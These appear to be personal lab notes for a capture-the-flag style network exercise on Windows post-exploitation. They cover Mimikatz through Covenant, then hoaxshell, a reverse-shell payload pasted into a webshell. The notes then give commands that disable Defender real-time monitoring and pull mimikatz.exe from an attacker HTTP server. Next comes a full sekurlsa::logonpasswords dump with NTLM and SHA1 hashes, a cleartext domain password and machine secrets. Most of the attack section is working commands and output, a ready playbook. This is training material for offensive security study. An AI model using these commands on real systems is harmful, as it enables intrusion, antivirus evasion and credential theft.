Now that we have administrator access to the machine, we can follow our post-exploitation methodology and dump credentials. To aid us in dumping credentials, we will be using the infamous tool Mimikatz. We will also be utilizing Covenant to drop Mimikatz.

![[Task 36 -  That's not a cat that's a dawg-20241014150208220.webp]]

Mimikatz is a well-known tool for a variety of post-exploitation activities. We will be using it to dump credentials from LSASS. [T1003](https://attack.mitre.org/techniques/T1003/001/) From MITRE ATT&CK. Described from ATT&CK as "Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores various credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct Lateral Movement using Use Alternate Authentication Material."  

To run Mimikatz, we can use Covenant to drop the binary. Covenant has a task for Mimikatz; however, it is outdated and does not work on modern Windows systems, so we will need to compile or download our binary to use.  

We can upload a Mimikatz binary using the `Upload` task and obtain a binary from the releases page [https://github.com/gentilkiwi/mimikatz/releases/](https://github.com/gentilkiwi/mimikatz/releases/) or compile the project yourself. Covenant will present you with a pop-up window to drop the file onto, and Covenant will host the file for you and upload the file to the server. Find an example of the window below.

![[Task 36 -  That's not a cat that's a dawg-20241014150423796.webp]]

To ensure a successful upload, you will need to specify where the file is to be uploaded on the target and the file's location on your attacking machine. Find an example of file path syntax below.

![[Task 36 -  That's not a cat that's a dawg-20241014150512569.webp]]

Once the file is uploaded, we can use the `Shell` task to execute the binary. Since Mimikatz has its own CLI, you will need to send all commands to be run within Mimikatz in one command so that Covenant can interpret it.  

---

Now that we have Mimikatz executing on the system, we can look through its modules and syntax. Find an outline of a few Mimikatz modules below.  

- `standard`
- `privilege`
- `crypto`
- `sekurlsa`
- `kerberos`
- `lsadump`
- `vault`
- and more

For this task, we will be focusing on the `privilege`, `token`, and `sekurlsa` modules. Within each of these modules, a number of commands can be used to perform various operations. For more information about all the features of Mimikatz, check out the GitHub wiki, [https://github.com/gentilkiwi/mimikatz/wiki](https://github.com/gentilkiwi/mimikatz/wiki).

The first module we will be looking at is `privilege`, from this module, we will use the `privilege::debug` command. This command will allow us to ensure that Mimikatz is running at the proper privilege levels before performing any operations.

The second module we will be looking at is `token`, from this module, we will use the `token::elevate` command. This command will perform token impersonation to gain elevated integrity on the system. Token elevation is not always necessary but can help to troubleshoot when Mimikatz is struggling to dump credentials.

The third module we will be looking at is `sekurlsa`, this module will contain a majority of the commands to interact with and abuse LSASS. From this module, we will be using the `sekurlsa::logonpasswords`. This command will dump the credentials of accounts already authenticated to the endpoint. We can also use the command `lsadump::lsa`, which has a similar function but will dump LSASS credentials from memory.  

We can put all of these commands together to make a final Mimikatz command that we can use in Covenant. If using this tool normally, you could send each one of these commands separately, but we have to send them a little bit differently because we are using Covenant. Find example syntax below for Mimikatz.  

Syntax: `.\Mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" exit`

It is important that you exit Mimikatz, or your shell task will never complete.

We should now have a working method to dump credentials on the endpoint.


> [!failure]
> Forget all the above because as you've been advised earlier we're not going to use COVENANT.


---

# Your job

## hoaxshell

Hoaxshell is a Windows reverse shell payload generator and handler that abuses the http(s) protocol to establish a beacon-like reverse shell, based on the following concept:

![[Task 36 -  That's not a cat that's a dawg-20241101160241987.webp]]

More info [here](https://github.com/t3l3machus/hoaxshell).

### Installing hoaxshell on the attacking machine

```

git clone https://github.com/t3l3machus/hoaxshell

cd ./hoaxshell

sudo pip3 install -r requirements.txt

chmod +x hoaxshell.py

```

  
  

> [!tip]
> If you have some trouble witn pip3 you can run


```
  sudo pip3 install -r requirements.txt --break-system-packages
```
  

### Running hoaxshell

```
python3 hoaxshell.py -s <tun0 IP>
```
  
 
![[Task 36 -  That's not a cat that's a dawg-20241101160504921.webp]]

- Go back to the webshell and paste the green code on the field.
- Click on the Execute button.
- You'll get a Reverse Shell on S-SRV01 with high privileges.

	![[Task 36 -  That's not a cat that's a dawg-20241104150300244.webp]]





## Mimikatz


### Uploading

- On the target machine where you have your  mimikatz.exe file open a python Web Sever.
```
- python3 -m http.server 80
```

- On the webshell run the following code:
```
- powershell.exe "Set-MpPreference -DisableRealtimeMonitoring 1"

- powershell.exe Invoke-WebRequest  http://10.50.107.22/mimikatz.exe -outfile  mimikatz.exe
```

### Running

- On the webshell run mimikatz.exe.
```
- .\Mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" exit

```




> [!Success]
> mimikatz(commandline) # privilege::debug
> Privilege '20' OK
> 
> mimikatz(commandline) # token::elevate
> Token Id  : 0
> User name : 
> SID name  : NT AUTHORITY\SYSTEM
> 
> 672	{0;000003e7} 1 D 21393     	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,21p)	Primary
>  -> Impersonated !
>  * Process Token : {0;000003e7} 0 D 805498    	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,28p)	Primary
>  * Thread Token  : {0;000003e7} 1 D 829758    	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,21p)	Impersonation (Delegation)
> 
> mimikatz(commandline) # sekurlsa::logonpasswords
> 
> Authentication Id : 0 ; 297294 (00000000:0004894e)
> Session           : Interactive from 1
> User Name         : watamet
> Domain            : HOLOLIVE
> Logon Server      : DC-SRV01
> Logon Time        : 11/4/2024 8:13:18 PM
> SID               : S-1-5-21-471847105-3603022926-1728018720-1132
> 	msv :	
> 	 [00000003] Primary
> 	 * Username : watamet
> 	 * Domain   : HOLOLIVE
> 	 * NTLM     : d8d41e6cf762a8c77776a1843d4141c9
> 	 * SHA1     : 7701207008976fdd6c6be9991574e2480853312d
> 	 * DPAPI    : 300d9ad961f6f680c6904ac6d0f17fd0
> 	tspkg :	
> 	wdigest :	
> 	 * Username : watamet
> 	 * Domain   : HOLOLIVE
> 	 * Password : (null)
> 	kerberos :	
> 	 * Username : watamet
> 	 * Domain   : HOLO.LIVE
> 	 * Password : Nothingtoworry!
> 	ssp :	
> 	credman :	
> 
> Authentication Id : 0 ; 996 (00000000:000003e4)
> Session           : Service from 0
> User Name         : S-SRV01$
> Domain            : HOLOLIVE
> Logon Server      : (null)
> Logon Time        : 11/4/2024 8:13:06 PM
> SID               : S-1-5-20
> 	msv :	
> 	 [00000003] Primary
> 	 * Username : S-SRV01$
> 	 * Domain   : HOLOLIVE
> 	 * NTLM     : fc6233285a4171f183bfdda0cfad35ce
> 	 * SHA1     : 9b3adc4cfd2250138e8e8d3ca7edef67fe49a288
> 	tspkg :	
> 	wdigest :	
> 	 * Username : S-SRV01$
> 	 * Domain   : HOLOLIVE
> 	 * Password : (null)
> 	kerberos :	
> 	 * Username : s-srv01$
> 	 * Domain   : HOLO.LIVE
> 	 * Password : (null)
> 	ssp :	
> 	credman :	
> 
> Authentication Id : 0 ; 27404 (00000000:00006b0c)
> Session           : Interactive from 1
> User Name         : UMFD-1
> Domain            : Font Driver Host
> Logon Server      : (null)
> Logon Time        : 11/4/2024 8:13:06 PM
> SID               : S-1-5-96-0-1
> 	msv :	
> 	 [00000003] Primary
> 	 * Username : S-SRV01$
> 	 * Domain   : HOLOLIVE
> 	 * NTLM     : fc6233285a4171f183bfdda0cfad35ce
> 	 * SHA1     : 9b3adc4cfd2250138e8e8d3ca7edef67fe49a288
> 	tspkg :	
> 	wdigest :	
> 	 * Username : S-SRV01$
> 	 * Domain   : HOLOLIVE
> 	 * Password : (null)
> 	kerberos :	
> 	 * Username : S-SRV01$
> 	 * Domain   : holo.live
> 	 * Password : 1c 2f 93 19 91 a8 ef 19 21 70 d2 b6 57 a8 11 14 c3 c8 53 7a b0 bb 4e dd 96 cc e5 92 68 0e 52 2a 2d c0 26 65 e8 74 48 f3 c1 25 22 86 c1 50 b0 9f e5 ee 02 c4 e4 49 06 cb 55 18 4b 61 fa 65 80 0d c9 6c b5 3b e8 cd e9 76 b4 a4 b9 4e 75 f8 f9 eb 1b 4b 5e 22 ef 86 60 26 f0 73 2f 00 41 63 a1 4c 9c 62 25 88 aa 4a 3b 63 65 9e 98 96 b7 6a ac f9 50 86 7b f2 64 6f 22 6f 5d 4d 3c bd 0d ce 4d 60 fd 1b 33 bd 6c 1d 58 1c 9e 18 a0 0c 4d 41 04 e4 0f cd 43 e8 07 df 97 ab eb d3 81 6b dc 58 a4 d1 4d 73 4c b4 3a 85 e9 58 66 26 fe eb 75 31 e2 6f 9b 34 37 43 c3 89 3e c5 e2 aa e8 a2 bc c2 a4 d4 92 6c 9d e1 95 37 d4 c7 79 46 bf 78 60 41 20 f8 b4 66 dd 9e 90 51 2e 0a 0e 35 49 e7 d4 a4 d1 c5 ba e0 a5 53 46 1c c4 5d 5c d9 7e 42 f6 e2 82 21 
> 	ssp :	
> 	credman :	
> 
> Authentication Id : 0 ; 26076 (00000000:000065dc)
> Session           : UndefinedLogonType from 0
> User Name         : (null)
> Domain            : (null)
> Logon Server      : (null)
> Logon Time        : 11/4/2024 8:13:05 PM
> SID               : 
> 	msv :	
> 	 [00000003] Primary
> 	 * Username : S-SRV01$
> 	 * Domain   : HOLOLIVE
> 	 * NTLM     : fc6233285a4171f183bfdda0cfad35ce
> 	 * SHA1     : 9b3adc4cfd2250138e8e8d3ca7edef67fe49a288
> 	tspkg :	
> 	wdigest :	
> 	kerberos :	
> 	ssp :	
> 	credman :	
> 
> Authentication Id : 0 ; 297212 (00000000:000488fc)
> Session           : Interactive from 1
> User Name         : watamet
> Domain            : HOLOLIVE
> Logon Server      : DC-SRV01
> Logon Time        : 11/4/2024 8:13:18 PM
> SID               : S-1-5-21-471847105-3603022926-1728018720-1132
> 	msv :	
> 	 [00000003] Primary
> 	 * Username : watamet
> 	 * Domain   : HOLOLIVE
> 	 * NTLM     : d8d41e6cf762a8c77776a1843d4141c9
> 	 * SHA1     : 7701207008976fdd6c6be9991574e2480853312d
> 	 * DPAPI    : 300d9ad961f6f680c6904ac6d0f17fd0
> 	tspkg :	
> 	wdigest :	
> 	 * Username : watamet
> 	 * Domain   : HOLOLIVE
> 	 * Password : (null)
> 	kerberos :	
> 	 * Username : watamet
> 	 * Domain   : HOLO.LIVE
> 	 * Password : Nothingtoworry!
> 	ssp :	
> 	credman :	
> 
> Authentication Id : 0 ; 995 (00000000:000003e3)
> Session           : Service from 0
> User Name         : IUSR
> Domain            : NT AUTHORITY
> Logon Server      : (null)
> Logon Time        : 11/4/2024 8:13:09 PM
> SID               : S-1-5-17
> 	msv :	
> 	tspkg :	
> 	wdigest :	
> 	 * Username : (null)
> 	 * Domain   : (null)
> 	 * Password : (null)
> 	kerberos :	
> 	ssp :	
> 	credman :	
> 
> Authentication Id : 0 ; 997 (00000000:000003e5)
> Session           : Service from 0
> User Name         : LOCAL SERVICE
> Domain            : NT AUTHORITY
> Logon Server      : (null)
> Logon Time        : 11/4/2024 8:13:07 PM
> SID               : S-1-5-19
> 	msv :	
> 	tspkg :	
> 	wdigest :	
> 	 * Username : (null)
> 	 * Domain   : (null)
> 	 * Password : (null)
> 	kerberos :	
> 	 * Username : (null)
> 	 * Domain   : (null)
> 	 * Password : (null)
> 	ssp :	
> 	credman :	
> 
> Authentication Id : 0 ; 45881 (00000000:0000b339)
> Session           : Interactive from 1
> User Name         : DWM-1
> Domain            : Window Manager
> Logon Server      : (null)
> Logon Time        : 11/4/2024 8:13:06 PM
> SID               : S-1-5-90-0-1
> 	msv :	
> 	 [00000003] Primary
> 	 * Username : S-SRV01$
> 	 * Domain   : HOLOLIVE
> 	 * NTLM     : fc6233285a4171f183bfdda0cfad35ce
> 	 * SHA1     : 9b3adc4cfd2250138e8e8d3ca7edef67fe49a288
> 	tspkg :	
> 	wdigest :	
> 	 * Username : S-SRV01$
> 	 * Domain   : HOLOLIVE
> 	 * Password : (null)
> 	kerberos :	
> 	 * Username : S-SRV01$
> 	 * Domain   : holo.live
> 	 * Password : 1c 2f 93 19 91 a8 ef 19 21 70 d2 b6 57 a8 11 14 c3 c8 53 7a b0 bb 4e dd 96 cc e5 92 68 0e 52 2a 2d c0 26 65 e8 74 48 f3 c1 25 22 86 c1 50 b0 9f e5 ee 02 c4 e4 49 06 cb 55 18 4b 61 fa 65 80 0d c9 6c b5 3b e8 cd e9 76 b4 a4 b9 4e 75 f8 f9 eb 1b 4b 5e 22 ef 86 60 26 f0 73 2f 00 41 63 a1 4c 9c 62 25 88 aa 4a 3b 63 65 9e 98 96 b7 6a ac f9 50 86 7b f2 64 6f 22 6f 5d 4d 3c bd 0d ce 4d 60 fd 1b 33 bd 6c 1d 58 1c 9e 18 a0 0c 4d 41 04 e4 0f cd 43 e8 07 df 97 ab eb d3 81 6b dc 58 a4 d1 4d 73 4c b4 3a 85 e9 58 66 26 fe eb 75 31 e2 6f 9b 34 37 43 c3 89 3e c5 e2 aa e8 a2 bc c2 a4 d4 92 6c 9d e1 95 37 d4 c7 79 46 bf 78 60 41 20 f8 b4 66 dd 9e 90 51 2e 0a 0e 35 49 e7 d4 a4 d1 c5 ba e0 a5 53 46 1c c4 5d 5c d9 7e 42 f6 e2 82 21 
> 	ssp :	
> 	credman :	
> 
> Authentication Id : 0 ; 45788 (00000000:0000b2dc)
> Session           : Interactive from 1
> User Name         : DWM-1
> Domain            : Window Manager
> Logon Server      : (null)
> Logon Time        : 11/4/2024 8:13:06 PM
> SID               : S-1-5-90-0-1
> 	msv :	
> 	 [00000003] Primary
> 	 * Username : S-SRV01$
> 	 * Domain   : HOLOLIVE
> 	 * NTLM     : fc6233285a4171f183bfdda0cfad35ce
> 	 * SHA1     : 9b3adc4cfd2250138e8e8d3ca7edef67fe49a288
> 	tspkg :	
> 	wdigest :	
> 	 * Username : S-SRV01$
> 	 * Domain   : HOLOLIVE
> 	 * Password : (null)
> 	kerberos :	
> 	 * Username : S-SRV01$
> 	 * Domain   : holo.live
> 	 * Password : 1c 2f 93 19 91 a8 ef 19 21 70 d2 b6 57 a8 11 14 c3 c8 53 7a b0 bb 4e dd 96 cc e5 92 68 0e 52 2a 2d c0 26 65 e8 74 48 f3 c1 25 22 86 c1 50 b0 9f e5 ee 02 c4 e4 49 06 cb 55 18 4b 61 fa 65 80 0d c9 6c b5 3b e8 cd e9 76 b4 a4 b9 4e 75 f8 f9 eb 1b 4b 5e 22 ef 86 60 26 f0 73 2f 00 41 63 a1 4c 9c 62 25 88 aa 4a 3b 63 65 9e 98 96 b7 6a ac f9 50 86 7b f2 64 6f 22 6f 5d 4d 3c bd 0d ce 4d 60 fd 1b 33 bd 6c 1d 58 1c 9e 18 a0 0c 4d 41 04 e4 0f cd 43 e8 07 df 97 ab eb d3 81 6b dc 58 a4 d1 4d 73 4c b4 3a 85 e9 58 66 26 fe eb 75 31 e2 6f 9b 34 37 43 c3 89 3e c5 e2 aa e8 a2 bc c2 a4 d4 92 6c 9d e1 95 37 d4 c7 79 46 bf 78 60 41 20 f8 b4 66 dd 9e 90 51 2e 0a 0e 35 49 e7 d4 a4 d1 c5 ba e0 a5 53 46 1c c4 5d 5c d9 7e 42 f6 e2 82 21 
> 	ssp :	
> 	credman :	
> 
> Authentication Id : 0 ; 27473 (00000000:00006b51)
> Session           : Interactive from 0
> User Name         : UMFD-0
> Domain            : Font Driver Host
> Logon Server      : (null)
> Logon Time        : 11/4/2024 8:13:06 PM
> SID               : S-1-5-96-0-0
> 	msv :	
> 	 [00000003] Primary
> 	 * Username : S-SRV01$
> 	 * Domain   : HOLOLIVE
> 	 * NTLM     : fc6233285a4171f183bfdda0cfad35ce
> 	 * SHA1     : 9b3adc4cfd2250138e8e8d3ca7edef67fe49a288
> 	tspkg :	
> 	wdigest :	
> 	 * Username : S-SRV01$
> 	 * Domain   : HOLOLIVE
> 	 * Password : (null)
> 	kerberos :	
> 	 * Username : S-SRV01$
> 	 * Domain   : holo.live
> 	 * Password : 1c 2f 93 19 91 a8 ef 19 21 70 d2 b6 57 a8 11 14 c3 c8 53 7a b0 bb 4e dd 96 cc e5 92 68 0e 52 2a 2d c0 26 65 e8 74 48 f3 c1 25 22 86 c1 50 b0 9f e5 ee 02 c4 e4 49 06 cb 55 18 4b 61 fa 65 80 0d c9 6c b5 3b e8 cd e9 76 b4 a4 b9 4e 75 f8 f9 eb 1b 4b 5e 22 ef 86 60 26 f0 73 2f 00 41 63 a1 4c 9c 62 25 88 aa 4a 3b 63 65 9e 98 96 b7 6a ac f9 50 86 7b f2 64 6f 22 6f 5d 4d 3c bd 0d ce 4d 60 fd 1b 33 bd 6c 1d 58 1c 9e 18 a0 0c 4d 41 04 e4 0f cd 43 e8 07 df 97 ab eb d3 81 6b dc 58 a4 d1 4d 73 4c b4 3a 85 e9 58 66 26 fe eb 75 31 e2 6f 9b 34 37 43 c3 89 3e c5 e2 aa e8 a2 bc c2 a4 d4 92 6c 9d e1 95 37 d4 c7 79 46 bf 78 60 41 20 f8 b4 66 dd 9e 90 51 2e 0a 0e 35 49 e7 d4 a4 d1 c5 ba e0 a5 53 46 1c c4 5d 5c d9 7e 42 f6 e2 82 21 
> 	ssp :	
> 	credman :	
> 
> Authentication Id : 0 ; 999 (00000000:000003e7)
> Session           : UndefinedLogonType from 0
> User Name         : S-SRV01$
> Domain            : HOLOLIVE
> Logon Server      : (null)
> Logon Time        : 11/4/2024 8:13:05 PM
> SID               : S-1-5-18
> 	msv :	
> 	tspkg :	
> 	wdigest :	
> 	 * Username : S-SRV01$
> 	 * Domain   : HOLOLIVE
> 	 * Password : (null)
> 	kerberos :	
> 	 * Username : s-srv01$
> 	 * Domain   : HOLO.LIVE
> 	 * Password : (null)
> 	ssp :	
> 	credman :	
